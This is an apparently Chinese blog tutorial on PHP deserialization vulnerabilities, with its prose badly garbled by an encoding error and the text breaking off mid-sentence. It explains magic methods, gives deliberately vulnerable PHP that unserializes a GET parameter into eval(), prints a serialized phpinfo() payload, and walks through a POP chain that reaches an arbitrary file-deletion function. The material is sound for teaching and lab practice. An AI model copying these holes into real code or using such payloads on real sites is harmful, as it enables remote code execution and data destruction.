<p>ç±»çš„å®ä½“åŒ–ç»“æœæ˜¯å¯¹è±¡ï¼Œè€Œå¯¹è±¡çš„æŠ½è±¡å°±æ˜¯ç±»ã€‚åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸éƒ½æ˜¯å…ˆæŠ½è±¡(å¹»æƒ³)å‡ºä¸€ä¸ªç±»ï¼Œå†ç”¨è¯¥ç±»å»åˆ›å»ºå¯¹è±¡(å®ç°å¹»æƒ³çš„å†…å®¹)ã€‚åœ¨ç¨‹åºä¸­ï¼Œç›´æ¥ä½¿ç”¨çš„æ˜¯æˆ‘ä»¬(å®ç°å¹»æƒ³)çš„å¯¹è±¡ï¼Œè€Œä¸æ˜¯æŠ½è±¡(å¹»æƒ³)çš„ç±»ã€‚</p>
<h4 id="~å˜é‡çš„å±æ€§"><a class="markdownIt-Anchor" href="#~å˜é‡çš„å±æ€§"></a> ~å˜é‡çš„å±æ€§</h4>
<p>publicè¡¨ç¤ºå…¨å±€ï¼Œç±»å†…éƒ¨å’Œå¤–éƒ¨å­ç±»éƒ½å¯ä»¥è®¿é—®ï¼›</p>
<p>privateè¡¨ç¤ºç§æœ‰çš„ï¼Œåªæœ‰æœ¬ç±»å†…éƒ¨å¯ä»¥ä½¿ç”¨ï¼›</p>
<p>protectedè¡¨ç¤ºå—ä¿æŠ¤çš„ï¼Œåªæœ‰æœ¬ç±»æˆ–å­ç±»æˆ–çˆ¶ç±»ä¸­å¯ä»¥è®¿é—®ï¼›</p>
<h4 id="~ååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#~ååºåˆ—åŒ–"></a> ~ååºåˆ—åŒ–</h4>
<h5 id="json_encode"><a class="markdownIt-Anchor" href="#json_encode"></a> json_encode()</h5>
<blockquote>
<p>PHP json_encode() ç”¨äºå¯¹å˜é‡è¿›è¡Œ JSON ç¼–ç ï¼Œè¯¥å‡½æ•°å¦‚æœæ‰§è¡ŒæˆåŠŸè¿”å› JSON æ•°æ®ï¼Œå¦åˆ™è¿”å› FALSE ã€‚</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$value</span>[,<span class="variable">$options</span> = <span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<h6 id="å‚æ•°"><a class="markdownIt-Anchor" href="#å‚æ•°"></a> å‚æ•°ï¼š</h6>
<ul>
<li>
<p><strong>value</strong>: è¦ç¼–ç çš„å€¼ã€‚è¯¥å‡½æ•°åªå¯¹ UTF-8 ç¼–ç çš„æ•°æ®æœ‰æ•ˆã€‚</p>
</li>
<li>
<p><strong>options</strong>:ç”±ä»¥ä¸‹å¸¸é‡ç»„æˆçš„äºŒè¿›åˆ¶æ©ç  JSON_HEX_QUOT, JSON_HEX_TAG, JSON_HEX_AMP, JSON_HEX_APOS, JSON_NUMERIC_CHECK, JSON_PRETTY_PRINT, JSON_UNESCAPED_SLASHES, JSON_FORCE_OBJECT, JSON_PRESERVE_ZERO_FRACTION, JSON_UNESCAPED_UNICODE, JSON_PARTIAL_OUTPUT_ON_ERRORã€‚</p>
<p>è¦æ³¨æ„çš„æ˜¯ JSON_UNESCAPED_UNICODE é€‰é¡¹ï¼Œå¦‚æœæˆ‘ä»¬ä¸å¸Œæœ›ä¸­æ–‡è¢«ç¼–ç ï¼Œå¯ä»¥æ·»åŠ è¯¥é€‰é¡¹ã€‚</p>
</li>
</ul>
<h5 id="serialize"><a class="markdownIt-Anchor" href="#serialize"></a> serialize()</h5>
<blockquote>
<p><strong>serialize()</strong> å‡½æ•°ç”¨äºåºåˆ—åŒ–å¯¹è±¡æˆ–æ•°ç»„ï¼Œå¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p>
<p><strong>serialize()</strong> å‡½æ•°åºåˆ—åŒ–å¯¹è±¡åï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å°†å®ƒä¼ é€’ç»™å…¶ä»–éœ€è¦å®ƒçš„åœ°æ–¹ï¼Œä¸”å…¶ç±»å‹å’Œç»“æ„ä¸ä¼šæ”¹å˜ã€‚</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">serialize</span>(mixer <span class="variable">$value</span>)</span><br></pre></td></tr></table></figure>
<h6 id="å‚æ•°valueè¦åºåˆ—åŒ–çš„å¯¹è±¡æˆ–æ•°ç»„"><a class="markdownIt-Anchor" href="#å‚æ•°valueè¦åºåˆ—åŒ–çš„å¯¹è±¡æˆ–æ•°ç»„"></a> å‚æ•°ï¼š$value:è¦åºåˆ—åŒ–çš„å¯¹è±¡æˆ–æ•°ç»„ã€‚</h6>
<h5 id="unserialize"><a class="markdownIt-Anchor" href="#unserialize"></a> unserialize()</h5>
<blockquote>
<p><strong>unserialize()</strong> å‡½æ•°ç”¨äºå°†é€šè¿‡ <a href="https://www.runoob.com/php/php-serialize-function.html">serialize() </a>å‡½æ•°åºåˆ—åŒ–åçš„å¯¹è±¡æˆ–æ•°ç»„è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶è¿”å›åŸå§‹çš„å¯¹è±¡ç»“æ„ã€‚</p>
<p>PHP ç‰ˆæœ¬è¦æ±‚: PHP 4, PHP 5, PHP 7</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">unserialize</span>(<span class="keyword">string</span> <span class="variable">$str</span>)</span><br></pre></td></tr></table></figure>
<p>å‚æ•°è¯´æ˜ï¼š</p>
<p>$str:åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ã€‚</p>
<h5 id="æ¼”ç¤º"><a class="markdownIt-Anchor" href="#æ¼”ç¤º"></a> æ¼”ç¤ºï¼š</h5>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221006202111066.png" alt="image-20221006202111066"></p>
<h3 id="äºŒ-ååºåˆ—åŒ–æ¼æ´"><a class="markdownIt-Anchor" href="#äºŒ-ååºåˆ—åŒ–æ¼æ´"></a> äºŒã€ååºåˆ—åŒ–æ¼æ´</h3>
<p>ä¸ºå•¥ä¼šäº§ç”Ÿè¿™ä¸ªæ¼æ´å‘¢ï¼Ÿ</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯é­”æœ¯æ–¹æ³•ï¼</p>
<h4 id="é­”æœ¯æ–¹æ³•"><a class="markdownIt-Anchor" href="#é­”æœ¯æ–¹æ³•"></a> é­”æœ¯æ–¹æ³•</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ<span class="title function_ invoke__">__invoke</span>() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–<span class="title function_ invoke__">unserialize</span>()ä¹‹å‰è¿è¡Œ</span><br><span class="line"></span><br><span class="line">__wakeupå°†åœ¨åºåˆ—åŒ–<span class="title function_ invoke__">serialize</span>()ä¹‹åç«‹å³è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">__call åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨ã€‚(å¿…é¡»æ»¡è¶³ä¸¤ä¸ªå‚æ•°)</span><br><span class="line"></span><br><span class="line">__get è·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨;åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œé€šè¿‡å®ƒå¯ä»¥åœ¨å¯¹è±¡çš„å¤–éƒ¨è·å–ç§æœ‰æˆå‘˜å±æ€§çš„å€¼</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set</span>() ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨<span class="keyword">isset</span>()æˆ–<span class="keyword">empty</span>()è§¦å‘</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨<span class="keyword">unset</span>()æ—¶è§¦å‘</span><br></pre></td></tr></table></figure>
<h5 id="demo"><a class="markdownIt-Anchor" href="#demo"></a> Demo</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hource</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$size</span> = <span class="number">114</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$f1</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;(s)(e)(r)(i)(a)(l)(i)(z)(e)(!)&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Do_you_know_unserialize_?&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$name</span>==<span class="string">&quot;size&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;size&gt;<span class="number">100</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;size-<span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString tigger&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This is __invoke&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Do_you_know_serialize_?&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Hource</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line"><span class="variable">$a</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;age;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221018211456021-16672739578731.png" alt="test"></p>
<p>è¿™é‡Œå°±ç®—ç»™å‡ºäº†Demoï¼ŒåŒæ ·ä¸å¥½ç†è§£æ€ä¹ˆå°±æ˜¯ååºåˆ—åŒ–æ¼æ´äº†ï¼Ÿ</p>
<h5 id="demo01-__wokeup"><a class="markdownIt-Anchor" href="#demo01-__wokeup"></a> Demo01-__wokeup()</h5>
<p>è¿™é‡Œæˆ‘ä»¬æ¥ç”¨__wokeup()æ¥åšä¸€ä¸ªæ¼æ´æ¼”ç¤ºï¼š</p>
<p>é¦–å…ˆæ¥çœ‹ä¸€ä¸‹ååºåˆ—åŒ–å®ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;TWe1v3&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&quot;SCR&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$test2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221018214636570-16672739578743.png" alt="image-20221018214636570"></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æ¼æ´å®ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;TWe1v3&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$test2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä»£ç å®¡è®¡ï¼š</p>
<p>01.å¯æ§å‚æ•°æ˜¯GETå‹stringå‚æ•°</p>
<p>02.åç«¯æ¥æ”¶å‚æ•°åè¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p>
<p>03.testç±»ä¸­å­˜åœ¨__wakeupé­”æœ¯æ–¹æ³•ï¼Œæ“ä½œæ˜¯eval($id)</p>
<p>æ„å»ºPOCï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test2</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221019011016911-16672739578732.png" alt="image-20221019011016911"></p>
<p>ç›´æ¥ä½¿ç”¨é“¾å­ï¼šO:4:â€œtestâ€:1:{s:1:â€œaâ€;s:10:â€œphpinfo();â€;}</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221019011242914-16672739578744.png" alt="image-20221019011242914"></p>
<p>åˆ°æ­¤ï¼Œååºåˆ—åŒ–çš„äº§ç”ŸåŸå› æˆ‘ä¸è¨€è€Œå–»äº†å§ï¼</p>
<h2 id="phpååºåˆ—åŒ–å¸¸è§è€ƒç‚¹"><a class="markdownIt-Anchor" href="#phpååºåˆ—åŒ–å¸¸è§è€ƒç‚¹"></a> phpååºåˆ—åŒ–å¸¸è§è€ƒç‚¹</h2>
<h3 id="popé“¾"><a class="markdownIt-Anchor" href="#popé“¾"></a> POPé“¾</h3>
<p>é€šè¿‡ç”¨æˆ·å¯æ§çš„ååºåˆ—åŒ–æ“ä½œï¼Œå…¶ä¸­å¯è§¦å‘çš„é­”æœ¯æ–¹æ³•ä¸ºå‡ºå‘ç‚¹ï¼Œåœ¨é­”æœ¯æ–¹æ³•ä¸­çš„å‡½æ•°åœ¨å…¶ä»–ç±»ä¸­å­˜åœ¨åŒåå‡½æ•°ï¼Œæˆ–é€šè¿‡ä¼ é€’ï¼Œå…³è”ç­‰å¯ä»¥è°ƒç”¨çš„å…¶ä»–æ‰§è¡Œæ•æ„Ÿæ“ä½œçš„å‡½æ•°ï¼Œç„¶åä¼ é€’å‚æ•°æ‰§è¡Œæ•æ„Ÿæ“ä½œï¼Œå³</p>
<p><mark>ç”¨æˆ·å¯æ§ååºåˆ—åŒ–â†’é­”æœ¯æ–¹æ³•â†’é­”æœ¯æ–¹æ³•ä¸­è°ƒç”¨çš„å…¶ä»–å‡½æ•°â†’åŒåå‡½æ•°æˆ–é€šè¿‡ä¼ é€’å¯è°ƒç”¨çš„å‡½æ•°â†’æ•æ„Ÿæ“ä½œ</mark></p>
<h4 id="å®ä¾‹å¤ç°"><a class="markdownIt-Anchor" href="#å®ä¾‹å¤ç°"></a> å®ä¾‹å¤ç°</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test3</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj)) <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">Delete</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_file</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = â€œ/<span class="keyword">var</span>/www/html/cache/tmp/&#123;<span class="variable language_">$this</span>-&gt;cache_file&#125;â€; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;I am a evil Delete function&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;I am a safe Delete function&#x27;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$user_data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$user_data</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="å®¡è®¡æºç "><a class="markdownIt-Anchor" href="#å®¡è®¡æºç "></a> å®¡è®¡æºç ï¼š</h5>
<p>é¦–å…ˆæˆ‘ä»¬çœ‹æœ€é™åˆ¶è¡Œçš„æ“ä½œåœ¨æœ€ä¸‹é¢ååºåˆ—åŒ–GETåˆ°çš„å‚æ•°dataï¼Œç„¶åæ‰§è¡Œecho (user_dataï¼Œè¿™é‡Œå¦‚æœ)user_dataæ˜¯ä¸€ä¸ªç±»å®ä¾‹åŒ–æ¥çš„å¯¹è±¡çš„è¯ï¼Œå°±ä¼šè§¦å‘å¯¹è±¡ä¸­çš„__tostring()é­”æœ¯æ–¹æ³•</p>
<p>æ¥ç€æ¥å•ç‹¬åˆ†ææ¯ä¸ªç±»ä¸­çš„å‡½æ•°å…³ç³»:</p>
<p>Test1</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test3</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj)) <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">Delete</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>.1 é¦–å…ˆå£°æ˜äº†$objå˜é‡</p>
<p>.2 ç±»ä¸­æœ‰______construct()å’Œ__tostring()é­”æœ¯æ–¹æ³•ï¼Œ__construct()æ–¹æ³•ä¸º(objå˜é‡èµ‹å€¼ä¸ºTest3ç±»çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œ__tostring()æ–¹æ³•åˆ¤æ–­å¦‚æœ)objå˜é‡å­˜åœ¨åˆ™è¿”å›è°ƒç”¨$objå¯¹è±¡ä¸­çš„Delete()å‡½æ•°</p>
<p>Test2:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_file</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = â€œ/<span class="keyword">var</span>/www/html/cache/tmp/&#123;<span class="variable language_">$this</span>-&gt;cache_file&#125;â€; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;I am a evil Delete function&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>.1é¦–å…ˆå£°æ˜äº†$cache_fileå˜é‡</p>
<p>.2 å®šä¹‰äº†Delete()å‡½æ•°ï¼Œå¦‚æœå®šä¹‰çš„$fileå˜é‡ä¸­çš„æ–‡ä»¶å­˜åœ¨ï¼Œåˆ™åˆ é™¤æ­¤æ–‡ä»¶å¹¶è¿”å›æç¤ºå†…å®¹</p>
<p>Test3ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;I am a safe Delete function&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>.1 å®šä¹‰äº†Delete()å‡½æ•°ï¼Œæ¬¡å‡½æ•°åªè¿”å›ä¸€å¥è¯ï¼Œæ²¡æœ‰æ•æ„Ÿæ“ä½œï¼Œä¸ºå®‰å…¨å‡½æ•°</p>
<h5 id="popé“¾æ„é€ "><a class="markdownIt-Anchor" href="#popé“¾æ„é€ "></a> <em>POPé“¾æ„é€ </em></h5>
<p>é¦–å…ˆå‡ºå‘ç‚¹æ˜¯Test1ä¸­çš„______tostring()é­”æœ¯æ–¹æ³•ï¼Œå…¶ä¸­è°ƒç”¨äº†(this-&gt;objä¸­çš„Delete()å‡½æ•°ï¼Œè€Œ)this-&gt;objæ˜¯åœ¨å®ä¾‹åŒ–å¯¹è±¡æ˜¯è§¦å‘______constructæ–¹æ³•ï¼Œå°†<span class="katex-error" title="ParseError: KaTeX parse error: Expected group after &#039;_&#039; at position 80: â€¦çš„æ‰§è¡Œæµå¦‚ä¸‹ `Test1ç±»â†’_Ì²_construct()â†’">this-&gt;objä½œä¸ºå®ä¾‹åŒ–Test3ç±»çš„å¯¹è±¡ï¼Œé‚£ä¹ˆæ­¤æ—¶è°ƒç”¨çš„å°±æ˜¯Test3ç±»ä¸­çš„Delete()å‡½æ•°ï¼Œåªè¿”å›ä¸€å¥æç¤ºï¼Œé‚£ä¹ˆæ­¤æ—¶çš„æ‰§è¡Œæµå¦‚ä¸‹ `Test1ç±»â†’__construct()â†’</span>this-&gt;obj=new Test3â†’__tostring()â†’Test3.Delete<code>æ–¹æ³• ä¸è¿‡åœ¨Test2ç±»ä¸­ä¹Ÿå®šä¹‰äº†å’ŒTest3ä¸­åŒåçš„å‡½æ•°Delete()ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ ç‰¹å®šçš„ååºåˆ—åŒ–å‚æ•°æ¥ä¿®æ”¹æ‰§è¡Œæµï¼Œä¹Ÿå°±æ˜¯æ„é€ æˆ‘ä»¬çš„POPé“¾ï¼Œåœ¨ååºåˆ—åŒ–åä½¿ç”¨Test2ç±»ä¸­çš„Delete()æ¥æ‰§è¡Œæ•æ„Ÿæ“ä½œï¼Œè®©æ‰§è¡Œæµå¦‚ä¸‹ </code>Test1ç±»â†’__construct()â†’$this-&gt;obj=new 